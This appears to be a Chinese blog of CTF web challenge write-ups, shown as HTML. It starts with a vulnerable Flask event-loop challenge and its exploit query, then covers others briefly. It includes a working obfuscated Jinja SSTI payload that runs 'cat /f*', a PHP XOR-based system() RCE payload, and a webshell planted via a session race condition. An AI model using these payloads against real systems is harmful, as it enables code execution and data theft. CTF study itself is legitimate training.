class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FLAG</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_event</span>(<span class="params">event</span>):</span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RollBackException</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_event_loop</span>():</span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. </span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params">url_prefix+<span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">entry_point</span>():</span><br><span class="line">    querystring = unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = <span class="built_in">dict</span>(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_handler</span>(<span class="params">args</span>):</span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.</span></span><br><span class="line"><span class="string">&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>(<span class="params">args</span>):</span><br><span class="line">    bool_show_source = <span class="built_in">str</span>(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = <span class="built_in">str</span>(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = <span class="built_in">open</span>(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_handler</span>(<span class="params">args</span>):</span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy</span></span><br><span class="line"><span class="string">&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consume_point_function</span>(<span class="params">args</span>):</span><br><span class="line">    point_to_consume = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_flag_function</span>(<span class="params">args</span>):</span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) </span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag_handler</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接甩一手源码，我们的主要目的是让diamonds等于5，然后getflag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680771500661-f0998df2-915e-4112-9ec4-f3dd9431aa51.png#averageHue=%23e5e4e3&clientId=ufe21471d-3457-4&from=paste&height=175&id=u3f8b54ca&name=image.png&originHeight=219&originWidth=696&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14909&status=done&style=none&taskId=u3e8b34fe-53ef-4231-8e13-533d3d7545e&title=&width=556.8" alt="image.png"><br>可是只有3points，正常来说只可以有3个diamons，因此这一题就和题目说的一样，需要loop，我们需要仔细关注一下逻辑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680771533246-c3b2c0a7-ec52-4c9f-af20-06ae05e611c7.png#averageHue=%231e2024&clientId=ufe21471d-3457-4&from=paste&height=329&id=u0e98492b&name=image.png&originHeight=411&originWidth=1238&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54813&status=done&style=none&taskId=u52c38f0e-89bf-4372-822d-c022c47b47d&title=&width=990.4" alt="image.png"><br>程序入口接受了我们get传入的参数，然后送进trigger_event函数，我们观察看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680771886001-629b7537-1ea3-4d3c-9c8c-3ee859cb6816.png#averageHue=%231f2124&clientId=ufe21471d-3457-4&from=paste&height=231&id=uaf7a6f10&name=image.png&originHeight=289&originWidth=761&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26141&status=done&style=none&taskId=u1461a706-2210-4cd3-94d4-8c81c5fe9cf&title=&width=608.8" alt="image.png"><br>这里其实就是进行一个日志处理，将我们的event放入session里的log属性，如果超过5个就只取最后五个，然后往<code>request.event_queue</code>也加入event，最后进入execute_event_loop方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute_event_loop</span>():</span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. </span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
<p>这个函数是对参数的主要处理，会判断传入的参数是否为a开头，如果为a开头调用的就是对应的hanler反之func，这里传入的是<code>?action=xxx</code>因此肯定调用_handler，并且注意一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这两个分别是处理什么呢？如果我们传入我们的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680772461301-90b60b49-eb1f-44a3-bfbd-2624a15d978e.png#averageHue=%23222428&clientId=ufe21471d-3457-4&from=paste&height=129&id=u87446454&name=image.png&originHeight=161&originWidth=685&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17533&status=done&style=none&taskId=u7a2e8051-37d9-4424-8625-a9a5f16a994&title=&width=548" alt="image.png"><br>action和args对应的就是上述结果，那我们首先调用trigger_event，这里为什么有个#呢，因为会加上<code>_hanlder、_func</code>这种脏字符，我们的目的是调用<code>trigger_event()</code>所以要注释掉，随后再retval那里调用的就是<code>trigger_event(args)</code>，而args就是上述恶意构造的payload，这样的话随后又会执行<code>buy_handler</code>，这里有关buy方法有个逻辑漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680772576885-c9e94b7a-c422-4318-a171-a8646acbb44e.png#averageHue=%231f2024&clientId=ufe21471d-3457-4&from=paste&height=343&id=ub3215469&name=image.png&originHeight=429&originWidth=1095&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67744&status=done&style=none&taskId=u8d745ea8-c9e5-4cc5-b7f9-2bf6a7bebf5&title=&width=876" alt="image.png"><br>不管你钱是不是够，都会先加上，如果不够就减去，那我们现在需要想办法让get_flag在<code>consume_point_function</code>之前执行，而我们上面的恶意数组刚好就实现了这一点，因此会调用get_flag方法，此时由于逻辑漏洞，diamonds是5，所以会将flag输入session的log属性，最后解码得到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680772659988-421ae265-49ba-4b2f-a4f8-cc3c98bfeea8.png#averageHue=%2332322b&clientId=ufe21471d-3457-4&from=paste&height=123&id=u44c21512&name=image.png&originHeight=154&originWidth=1498&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=378172&status=done&style=none&taskId=ueb3af4e1-75e9-4520-b9bb-c56acef624c&title=&width=1198.4" alt="image.png"><br>二次base64解码</p>
<h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><p>考点：简单的Python SSTI<br><code>&#123;%print((lipsum.__globals__["__\x62uiltins__"])["ev\x61l"]("__imp\x6frt__('\x6fs').p\x6fpen")('cat /f*').read())%&#125;</code></p>
<h1 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h1><p>考点：任意文件读取<br>我甚至不想记录</p>
<h1 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h1><p>考点：异或RCE<br><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</code><br>在这<code>(is_nan^(6).(4)).(tan^(1).(5));</code>表示<code>_GET</code>;<code>(is_nan^(6).(4))</code>表示<code>_G</code>,后半部分是<code>ET</code><br>字符串<code>is_nan</code>和字符串<code>64</code>异或得到的结果就是那样，所以可以绕过。</p>
<h1 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h1><p>考点：JWT伪造<br>我都懒得说了，妈的我以为是啥题目，看了一圈，robots.txt告诉你key<br>然后伪造就得到了flag<br>但是你给了个上传点我以为是啥东西，乌鱼子</p>
<h1 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h1><p>脑瘫题目，你不会说中文吗。。。</p>
<h1 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h1><p>考点：webshell里的su使用，session条件竞争<br>感觉这题放在当时应该是一道挺硬核的题目，只可惜今非昔比<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681052952868-d4a4758c-fae5-44f6-91b3-53942d1df62b.png#averageHue=%23d9be8c&clientId=u41d96f62-3e19-4&from=paste&height=55&id=u659b7e9e&name=image.png&originHeight=69&originWidth=1055&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8457&status=done&style=none&taskId=u3a1db540-9133-4c07-abe4-abcece59382&title=&width=844" alt="image.png"><br>敏感file，任意文件读取，发现没啥用，猜测后端用的是include，所以session条件竞争，webshell写进去了，然后蚁剑连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681052986346-5eaab9c0-42dd-452d-a9a1-fdc414a159c2.png#averageHue=%23efefef&clientId=u41d96f62-3e19-4&from=paste&height=363&id=u95f5186e&name=image.png&originHeight=454&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39829&status=done&style=none&taskId=u48cc4ef8-10aa-4170-9fd2-b0b4ab34f17&title=&width=1057.6" alt="image.png"><br>找了半天发现flag，还有一个README文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681053006158-9920f09e-61ea-4cb4-abe2-1d516f9c30a1.png#averageHue=%23f2f1f1&clientId=u41d96f62-3e19-4&from=paste&height=117&id=u1ba2d9fd&name=image.png&originHeight=146&originWidth=910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8057&status=done&style=none&taskId=ua69823e0-1d03-47ab-be75-0682b3c1289&title=&width=728" alt="image.png"><br>解码过后发现就是<code>GWHTCTF</code>，这应该是某个用户的密码，伪终端查看一手，发现flag.txt是没有权限的：<br><img 